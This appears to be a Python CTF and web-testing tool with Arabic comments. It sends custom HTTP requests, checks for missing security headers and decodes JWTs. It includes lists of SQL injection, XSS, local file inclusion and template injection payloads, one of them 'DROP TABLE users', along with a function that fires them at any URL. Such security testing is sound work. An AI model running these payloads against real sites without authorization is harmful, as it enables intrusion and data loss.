#!/usr/bin/env python3
"""
RAQIB CTF HTTP Request Builder & Analyzer
══════════════════════════════════════════

مساعد تحليل الويب المدمج — إرسال وتحليل طلبات HTTP مخصصة
بدون الحاجة لأدوات خارجية (مثل Burp أو Postman).

Features:
  - إرسال طلبات GET/POST/PUT/DELETE/PATCH/OPTIONS/HEAD
  - تعديل Headers, Cookies, Body
  - اختبار Payloads تلقائي (SQLi, XSS, LFI, SSTI, Command Injection)
  - تحليل الاستجابة (headers, cookies, redirects, security headers)
  - استخراج وتحليل JWT tokens
  - فحص CORS misconfigurations
  - إرسال طلبات متعددة (batch requests)
  - تصدير بصيغة curl command

Usage:
  python3 http_request_builder.py request <url> [--method GET] [--header "Key: Value"]
  python3 http_request_builder.py fuzz <url> --param <name> --wordlist <file>
  python3 http_request_builder.py test-sqli <url> --param <name>
  python3 http_request_builder.py test-xss <url> --param <name>
  python3 http_request_builder.py analyze <url>
  python3 http_request_builder.py jwt-decode <token>
  python3 http_request_builder.py interactive

Pure Python — uses only urllib (stdlib).
"""
from __future__ import annotations
import argparse, base64, json, os, re, sys, time
import urllib.request, urllib.parse, urllib.error
from http.cookiejar import CookieJar

NC = '\033[0m'
GREEN = '\033[0;32m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
RED = '\033[1;31m'
BOLD = '\033[1m'
GREY = '\033[1;30m'

# ═══════════════════════════════════════════════════════════════════
# 1) HTTP REQUEST ENGINE
# ═══════════════════════════════════════════════════════════════════

def send_request(url: str, method: str = 'GET', headers: dict = None,
                 data: str = None, cookies: str = None,
                 follow_redirects: bool = True,
                 timeout: int = 15) -> dict:
    """Send an HTTP request and return structured response."""
    if headers is None:
        headers = {}

    # Default headers
    if 'User-Agent' not in headers:
        headers['User-Agent'] = 'RAQIB-CTF/2.2 (Security Research)'
    if cookies:
        headers['Cookie'] = cookies

    body = data.encode('utf-8') if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method.upper())

    result = {
        'url': url,
        'method': method.upper(),
        'request_headers': dict(headers),
    }

    start = time.time()
    try:
        if follow_redirects:
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(CookieJar()),
                urllib.request.HTTPRedirectHandler()
            )
        else:
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *args, **kwargs):
                    return None
            opener = urllib.request.build_opener(NoRedirect)

        with opener.open(req, timeout=timeout) as resp:
            result['status'] = resp.status
            result['reason'] = resp.reason
            result['response_headers'] = dict(resp.headers)
            result['url_final'] = resp.url
            body_bytes = resp.read(1024 * 1024)  # Max 1MB
            try:
                result['body'] = body_bytes.decode('utf-8', errors='replace')
            except Exception:
                result['body'] = repr(body_bytes[:500])
            result['body_length'] = len(body_bytes)

    except urllib.error.HTTPError as e:
        result['status'] = e.code
        result['reason'] = e.reason
        result['response_headers'] = dict(e.headers) if e.headers else {}
        try:
            result['body'] = e.read(1024 * 1024).decode('utf-8', errors='replace')
        except Exception:
            result['body'] = ''
        result['body_length'] = len(result.get('body', ''))

    except urllib.error.URLError as e:
        result['status'] = 0
        result['reason'] = str(e.reason)
        result['body'] = ''

    except Exception as e:
        result['status'] = 0
        result['reason'] = str(e)
        result['body'] = ''

    result['elapsed_ms'] = round((time.time() - start) * 1000, 1)
    return result


def print_response(resp: dict, show_body: bool = True, max_body: int = 500):
    """Pretty-print an HTTP response."""
    status = resp.get('status', 0)
    if 200 <= status < 300:
        color = GREEN
    elif 300 <= status < 400:
        color = CYAN
    elif 400 <= status < 500:
        color = YELLOW
    else:
        color = RED

    print(f"\n  {BOLD}{'─' * 55}{NC}")
    print(f"  {color}{resp.get('method', '?')} {resp.get('url', '?')}{NC}")
    print(f"  {color}HTTP {status} {resp.get('reason', '')}{NC}  ({resp.get('elapsed_ms', 0)}ms)")

    # Response headers
    rh = resp.get('response_headers', {})
    if rh:
        print(f"\n  {GREY}Response Headers:{NC}")
        for k, v in rh.items():
            # Highlight security headers
            if k.lower() in ('x-frame-options', 'content-security-policy',
                            'strict-transport-security', 'x-content-type-options',
                            'x-xss-protection', 'set-cookie'):
                print(f"    {CYAN}{k}: {v}{NC}")
            else:
                print(f"    {k}: {v}")

    # Body
    if show_body and resp.get('body'):
        body = resp['body']
        print(f"\n  {GREY}Body ({resp.get('body_length', 0)} bytes):{NC}")
        print(f"    {body[:max_body]}")
        if len(body) > max_body:
            print(f"    {GREY}... ({len(body) - max_body} more bytes){NC}")


# ═══════════════════════════════════════════════════════════════════
# 2) SECURITY ANALYSIS
# ═══════════════════════════════════════════════════════════════════

SECURITY_HEADERS = {
    'strict-transport-security': ('HSTS', 'Enforces HTTPS connections'),
    'content-security-policy': ('CSP', 'Prevents XSS and data injection'),
    'x-frame-options': ('X-Frame-Options', 'Prevents clickjacking'),
    'x-content-type-options': ('X-Content-Type', 'Prevents MIME sniffing'),
    'x-xss-protection': ('X-XSS-Protection', 'Legacy XSS filter'),
    'referrer-policy': ('Referrer-Policy', 'Controls referrer info'),
    'permissions-policy': ('Permissions-Policy', 'Controls browser features'),
    'x-permitted-cross-domain-policies': ('X-Permitted-CDP', 'Flash/PDF access control'),
}


def analyze_security(resp: dict) -> list[dict]:
    """Analyze response for security issues."""
    findings = []
    rh = {k.lower(): v for k, v in resp.get('response_headers', {}).items()}

    # Missing security headers
    for header, (name, desc) in SECURITY_HEADERS.items():
        if header not in rh:
            findings.append({
                'type': 'missing_header',
                'severity': 'medium' if header in ('content-security-policy', 'strict-transport-security') else 'low',
                'title': f'Missing {name} header',
                'description': desc,
            })

    # Cookie security
    for key, val in resp.get('response_headers', {}).items():
        if key.lower() == 'set-cookie':
            cookie_lower = val.lower()
            if 'secure' not in cookie_lower:
                findings.append({
                    'type': 'insecure_cookie',
                    'severity': 'medium',
                    'title': 'Cookie without Secure flag',
                    'description': f'Cookie: {val[:60]}',
                })
            if 'httponly' not in cookie_lower:
                findings.append({
                    'type': 'insecure_cookie',
                    'severity': 'medium',
                    'title': 'Cookie without HttpOnly flag',
                    'description': f'Cookie: {val[:60]}',
                })
            if 'samesite' not in cookie_lower:
                findings.append({
                    'type': 'insecure_cookie',
                    'severity': 'low',
                    'title': 'Cookie without SameSite attribute',
                    'description': f'Cookie: {val[:60]}',
                })

    # Server version disclosure
    server = rh.get('server', '')
    if re.search(r'\d+\.\d+', server):
        findings.append({
            'type': 'info_disclosure',
            'severity': 'low',
            'title': 'Server version disclosure',
            'description': f'Server: {server}',
        })

    # CORS misconfiguration
    acao = rh.get('access-control-allow-origin', '')
    if acao == '*':
        findings.append({
            'type': 'cors_misconfiguration',
            'severity': 'medium',
            'title': 'Wildcard CORS (Access-Control-Allow-Origin: *)',
            'description': 'Any origin can make cross-origin requests',
        })

    # Information in body
    body = resp.get('body', '')
    if re.search(r'(stack\s*trace|traceback|exception|error\s*in|debug\s*mode)', body, re.I):
        findings.append({
            'type': 'info_disclosure',
            'severity': 'medium',
            'title': 'Error/Debug information in response',
            'description': 'Response contains stack traces or debug info',
        })

    return findings


# ═══════════════════════════════════════════════════════════════════
# 3) PAYLOAD TESTING
# ═══════════════════════════════════════════════════════════════════

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
    "1' AND '1'='1", "admin'--", "' UNION SELECT NULL--",
    "1; DROP TABLE users--", "' OR ''='", "1' ORDER BY 1--",
    "') OR ('1'='1", "1 AND SLEEP(3)",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)",
    "\"><script>alert(1)</script>", "'-alert(1)-'",
    "<body onload=alert(1)>", "{{7*7}}",
    "${7*7}", "<marquee onstart=alert(1)>",
]

LFI_PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "/etc/passwd%00", "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ", "..\\..\\..\\windows\\win.ini",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
    "{{config}}", "{{self.__class__}}", "{7*7}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
]


def test_injection(url: str, param: str, payloads: list[str],
                   attack_type: str, method: str = 'GET') -> list[dict]:
    """Test a parameter with injection payloads."""
    results = []
    baseline = send_request(url, method=method, timeout=10)
    baseline_len = baseline.get('body_length', 0)
    baseline_status = baseline.get('status', 0)

    for payload in payloads:
        # Build URL with payload
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        if method == 'POST':
            data = urllib.parse.urlencode({param: payload})
            resp = send_request(url, method='POST', data=data,
                              headers={'Content-Type': 'application/x-www-form-urlencoded'},
                              timeout=10)
        else:
            resp = send_request(test_url, method=method, timeout=10)

        # Analyze response for signs of vulnerability
        suspicious = False
        indicators = []

        body = resp.get('body', '').lower()
        status = resp.get('status', 0)
        resp_len = resp.get('body_length', 0)
        elapsed = resp.get('elapsed_ms', 0)

        # SQLi indicators
        if attack_type == 'sqli':
            if any(e in body for e in ['sql syntax', 'mysql', 'sqlite', 'postgresql',
                                        'ora-', 'odbc', 'unclosed quotation']):
                suspicious = True
                indicators.append('SQL error in response')
            if abs(resp_len - baseline_len) > baseline_len * 0.5 and resp_len > 100:
                suspicious = True
                indicators.append(f'Response size changed significantly ({baseline_len}→{resp_len})')
            if 'SLEEP' in payload.upper() and elapsed > 3000:
                suspicious = True
                indicators.append(f'Time-based blind (elapsed={elapsed}ms)')

        # XSS indicators
        elif attack_type == 'xss':
            if payload.lower() in body:
                suspicious = True
                indicators.append('Payload reflected in response (no encoding)')
            if 'content-type' in resp.get('response_headers', {}):
                ct = resp['response_headers'].get('Content-Type', '').lower()
                if 'text/html' in ct and payload in resp.get('body', ''):
                    suspicious = True
                    indicators.append('Payload reflected in HTML response')

        # LFI indicators
        elif attack_type == 'lfi':
            if 'root:' in body or '[extensions]' in body:
                suspicious = True
                indicators.append('File content disclosed')

        # SSTI indicators
        elif attack_type == 'ssti':
            if '49' in body and '7*7' in payload:
                suspicious = True
                indicators.append('Template expression evaluated (49 found)')

        if suspicious:
            results.append({
                'payload': payload,
                'status': status,
                'body_length': resp_len,
                'elapsed_ms': elapsed,
                'indicators': indicators,
            })

    return results


# ═══════════════════════════════════════════════════════════════════
# 4) JWT DECODER
# ═══════════════════════════════════════════════════════════════════

def decode_jwt(token: str) -> dict:
    """Decode a JWT token without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {'error': 'Not a valid JWT (expected 3 parts)'}

    def b64url_decode(s):
        s += '=' * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        header = {'error': 'Cannot decode header'}

    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        payload = {'error': 'Cannot decode payload'}

    # Check for common vulnerabilities
    vulns = []
    if header.get('alg', '').lower() == 'none':
        vulns.append('⚠ Algorithm set to "none" — signature bypass possible!')
    if header.get('alg', '').upper() in ('HS256', 'HS384', 'HS512'):
        vulns.append('ℹ HMAC algorithm — try brute-forcing the secret key')
    if 'exp' in payload:
        import datetime
        try:
            exp_time = datetime.datetime.fromtimestamp(payload['exp'])
            if exp_time < datetime.datetime.now():
                vulns.append(f'⚠ Token expired at {exp_time}')
            else:
                vulns.append(f'ℹ Expires at {exp_time}')
        except Exception:
            pass
    if 'admin' in str(payload).lower():
        vulns.append('ℹ Contains admin-related claims')

    return {'header': header, 'payload': payload, 'signature': parts[2][:20] + '...', 'vulnerabilities': vulns}


# ═══════════════════════════════════════════════════════════════════
# 5) INTERACTIVE MODE
# ═══════════════════════════════════════════════════════════════════

def to_curl(url: str, method: str = 'GET', headers: dict = None, data: str = None) -> str:
    """Convert request to curl command."""
    cmd = f"curl -X {method}"
    if headers:
        for k, v in headers.items():
            cmd += f" -H '{k}: {v}'"
    if data:
        cmd += f" -d '{data}'"
    cmd += f" '{url}'"
    return cmd


def interactive_mode():
    """Interactive HTTP request builder."""
    print(f"\n  {BOLD}🌐 RAQIB HTTP Request Builder (Interactive){NC}")
    print(f"  Type 'help' for commands, 'quit' to exit\n")

    session_headers = {}
    session_cookies = ''

    while True:
        try:
            cmd = input(f"  {CYAN}http>{NC} ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not cmd:
            continue

        parts = cmd.split(maxsplit=1)
        action = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''

        if action == 'quit' or action == 'exit':
            break

        elif action == 'help':
            print(f"""
  {BOLD}Commands:{NC}
    get <url>              Send GET request
    post <url>             Send POST request (prompts for body)
    head <url>             Send HEAD request
    header <Key: Value>    Set session header
    cookie <cookies>       Set session cookies
    headers                Show session headers
    analyze <url>          Security analysis
    jwt <token>            Decode JWT token
    sqli <url> <param>     Test SQL injection
    xss <url> <param>      Test XSS
    lfi <url> <param>      Test LFI
    curl <url>             Show as curl command
    clear                  Clear session headers
    quit                   Exit
""")

        elif action in ('get', 'post', 'put', 'delete', 'patch', 'head', 'options'):
            data = None
            if action == 'post':
                data = input(f"    Body: ").strip()
            resp = send_request(arg, method=action.upper(),
                              headers=session_headers,
                              cookies=session_cookies, data=data)
            print_response(resp, show_body=(action != 'head'))

        elif action == 'header':
            if ':' in arg:
                k, v = arg.split(':', 1)
                session_headers[k.strip()] = v.strip()
                print(f"    {GREEN}Set: {k.strip()}: {v.strip()}{NC}")
            else:
                print(f"    {RED}Format: header Key: Value{NC}")

        elif action == 'cookie':
            session_cookies = arg
            print(f"    {GREEN}Cookies set{NC}")

        elif action == 'headers':
            if session_headers:
                for k, v in session_headers.items():
                    print(f"    {k}: {v}")
            else:
                print(f"    {GREY}No session headers set{NC}")

        elif action == 'analyze':
            resp = send_request(arg, headers=session_headers, cookies=session_cookies)
            print_response(resp, show_body=False)
            findings = analyze_security(resp)
            if findings:
                print(f"\n  {BOLD}Security Findings:{NC}")
                for f in findings:
                    color = RED if f['severity'] in ('high', 'critical') else YELLOW
                    print(f"    {color}[{f['severity']}] {f['title']}{NC}")
                    print(f"      {f['description']}")
            else:
                print(f"    {GREEN}No issues found{NC}")

        elif action == 'jwt':
            result = decode_jwt(arg)
            print(f"\n  {BOLD}JWT Decoded:{NC}")
            print(f"  Header:  {json.dumps(result.get('header', {}), indent=2)}")
            print(f"  Payload: {json.dumps(result.get('payload', {}), indent=2)}")
            if result.get('vulnerabilities'):
                print(f"\n  {YELLOW}Findings:{NC}")
                for v in result['vulnerabilities']:
                    print(f"    {v}")

        elif action == 'sqli':
            parts2 = arg.split()
            if len(parts2) >= 2:
                results = test_injection(parts2[0], parts2[1], SQLI_PAYLOADS, 'sqli')
                if results:
                    print(f"\n  {RED}⚠ Potential SQL Injection found!{NC}")
                    for r in results:
                        print(f"    Payload: {r['payload']}")
                        print(f"    Indicators: {', '.join(r['indicators'])}")
                else:
                    print(f"    {GREEN}No SQLi indicators found{NC}")
            else:
                print(f"    Usage: sqli <url> <param_name>")

        elif action == 'xss':
            parts2 = arg.split()
            if len(parts2) >= 2:
                results = test_injection(parts2[0], parts2[1], XSS_PAYLOADS, 'xss')
                if results:
                    print(f"\n  {RED}⚠ Potential XSS found!{NC}")
                    for r in results:
                        print(f"    Payload: {r['payload']}")
                        print(f"    Indicators: {', '.join(r['indicators'])}")
                else:
                    print(f"    {GREEN}No XSS indicators found{NC}")
            else:
                print(f"    Usage: xss <url> <param_name>")

        elif action == 'lfi':
            parts2 = arg.split()
            if len(parts2) >= 2:
                results = test_injection(parts2[0], parts2[1], LFI_PAYLOADS, 'lfi')
                if results:
                    print(f"\n  {RED}⚠ Potential LFI found!{NC}")
                    for r in results:
                        print(f"    Payload: {r['payload']}")
                else:
                    print(f"    {GREEN}No LFI indicators found{NC}")

        elif action == 'curl':
            print(f"    {to_curl(arg, headers=session_headers)}")

        elif action == 'clear':
            session_headers = {}
            session_cookies = ''
            print(f"    {GREEN}Session cleared{NC}")

        else:
            print(f"    {RED}Unknown command. Type 'help'{NC}")


# ═══════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="RAQIB CTF HTTP Request Builder & Analyzer")
    sub = parser.add_subparsers(dest='command')

    p_req = sub.add_parser('request', help='Send HTTP request')
    p_req.add_argument('url')
    p_req.add_argument('--method', '-X', default='GET')
    p_req.add_argument('--header', '-H', action='append', default=[])
    p_req.add_argument('--data', '-d', default=None)
    p_req.add_argument('--cookie', '-b', default=None)
    p_req.add_argument('--no-follow', action='store_true')
    p_req.add_argument('--json-output', action='store_true')

    p_analyze = sub.add_parser('analyze', help='Security analysis')
    p_analyze.add_argument('url')

    p_sqli = sub.add_parser('test-sqli', help='Test SQL injection')
    p_sqli.add_argument('url')
    p_sqli.add_argument('--param', required=True)
    p_sqli.add_argument('--method', default='GET')

    p_xss = sub.add_parser('test-xss', help='Test XSS')
    p_xss.add_argument('url')
    p_xss.add_argument('--param', required=True)

    p_lfi = sub.add_parser('test-lfi', help='Test LFI')
    p_lfi.add_argument('url')
    p_lfi.add_argument('--param', required=True)

    p_ssti = sub.add_parser('test-ssti', help='Test SSTI')
    p_ssti.add_argument('url')
    p_ssti.add_argument('--param', required=True)

    p_jwt = sub.add_parser('jwt-decode', help='Decode JWT token')
    p_jwt.add_argument('token')

    sub.add_parser('interactive', help='Interactive mode')

    args = parser.parse_args()

    if args.command == 'request':
        headers = {}
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()
        resp = send_request(args.url, args.method, headers, args.data,
                          args.cookie, not args.no_follow)
        if args.json_output:
            print(json.dumps(resp, indent=2, ensure_ascii=False))
        else:
            print_response(resp)

    elif args.command == 'analyze':
        resp = send_request(args.url)
        print_response(resp, show_body=False)
        findings = analyze_security(resp)
        print(f"\n  {BOLD}Security Analysis ({len(findings)} findings):{NC}")
        for f in findings:
            color = RED if f['severity'] in ('high', 'critical') else YELLOW if f['severity'] == 'medium' else GREY
            print(f"    {color}[{f['severity']:8s}] {f['title']}{NC}")

    elif args.command == 'test-sqli':
        results = test_injection(args.url, args.param, SQLI_PAYLOADS, 'sqli', args.method)
        if results:
            print(f"\n  {RED}⚠ {len(results)} potential SQL injection points found!{NC}")
            for r in results:
                print(f"    Payload: {r['payload']}")
                print(f"    Indicators: {', '.join(r['indicators'])}\n")
        else:
            print(f"  {GREEN}No SQL injection indicators found{NC}")

    elif args.command == 'test-xss':
        results = test_injection(args.url, args.param, XSS_PAYLOADS, 'xss')
        if results:
            print(f"\n  {RED}⚠ {len(results)} potential XSS points found!{NC}")
            for r in results:
                print(f"    Payload: {r['payload']}\n")
        else:
            print(f"  {GREEN}No XSS indicators found{NC}")

    elif args.command == 'test-lfi':
        results = test_injection(args.url, args.param, LFI_PAYLOADS, 'lfi')
        if results:
            print(f"\n  {RED}⚠ {len(results)} potential LFI points found!{NC}")
        else:
            print(f"  {GREEN}No LFI indicators found{NC}")

    elif args.command == 'test-ssti':
        results = test_injection(args.url, args.param, SSTI_PAYLOADS, 'ssti')
        if results:
            print(f"\n  {RED}⚠ {len(results)} potential SSTI points found!{NC}")
        else:
            print(f"  {GREEN}No SSTI indicators found{NC}")

    elif args.command == 'jwt-decode':
        result = decode_jwt(args.token)
        print(json.dumps(result, indent=2, ensure_ascii=False))

    elif args.command == 'interactive':
        interactive_mode()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
